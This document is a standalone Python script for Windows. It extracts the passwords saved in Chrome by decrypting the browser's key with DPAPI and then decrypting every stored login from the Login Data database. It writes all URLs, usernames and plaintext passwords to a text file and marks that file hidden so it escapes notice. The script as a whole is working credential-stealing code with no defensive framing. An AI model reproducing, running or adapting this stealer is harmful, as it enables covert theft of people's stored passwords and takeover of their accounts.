import os
import sqlite3
import shutil
import json
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import ctypes  # For setting the file attribute to hidden

def get_encryption_key():
    # Path to the 'Local State' file for Chrome
    local_state_path = os.path.expanduser(
        "~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    # Remove DPAPI prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    try:
        # Chromium passwords are encrypted with AES in GCM mode
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except Exception as e:
        return f"Could not decrypt: {e}"

def extract_chrome_passwords():
    # Path to Chrome's default login data
    db_path = os.path.expanduser(
        "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    )
    temp_db_path = os.path.expanduser("~\\AppData\\Local\\Temp\\Login Data")
    shutil.copyfile(db_path, temp_db_path)

    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()

    cursor.execute(
        "SELECT origin_url, username_value, password_value FROM logins"
    )
    passwords = []
    key = get_encryption_key()

    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)
        passwords.append(
            {
                "url": url,
                "username": username,
                "password": decrypted_password,
            }
        )

    conn.close()
    os.remove(temp_db_path)
    return passwords

def save_passwords_to_file(passwords):
    # Define the file name
    file_name = "browser_passwords.txt"
    
    # Check if the file already exists and delete it
    if os.path.exists(file_name):
        os.remove(file_name)

    # Save the passwords to the file
    with open(file_name, "w") as file:
        for entry in passwords:
            file.write(
                f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n\n"
            )
    print(f"Passwords saved to '{file_name}'.")
    hide_file(file_name)


def hide_file(file_path):
    # Use ctypes to set the file attribute to hidden
    FILE_ATTRIBUTE_HIDDEN = 0x02
    result = ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)
    if result:
        print(f"File '{file_path}' has been hidden.")
    else:
        print(f"Failed to hide the file '{file_path}'.")

if __name__ == "__main__":
    try:
        passwords = extract_chrome_passwords()
        save_passwords_to_file(passwords)
    except Exception as e:
        print(f"An error occurred: {e}")
